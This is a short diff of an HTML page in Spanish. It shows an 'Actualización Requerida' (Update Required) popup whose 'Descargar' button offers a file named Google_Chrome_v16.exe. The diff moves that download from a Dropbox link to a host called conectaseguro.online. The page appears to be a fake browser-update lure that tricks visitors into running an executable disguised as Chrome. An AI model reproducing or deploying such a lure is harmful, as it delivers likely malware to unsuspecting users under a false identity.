@@ -156,7 +156,7 @@ filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#c1bfbf', end
 	 <div class="a-area">
 		<div class="a-left">Actualización Requerida</div>
 		<div class="a-right">
-			<a target="_blank" onclick="document.getElementById('windrag').style.display = 'none';" href="https://www.dropbox.com/s/rhn38eep25bixxq/Google_Chrome_v16.exe?dl=1">Descargar</a>
+			<a target="_blank" onclick="document.getElementById('windrag').style.display = 'none';" href="https://conectaseguro.online/setup/Google_Chrome_v16.exe">Descargar</a>
 		</div>
 	 </div>
 
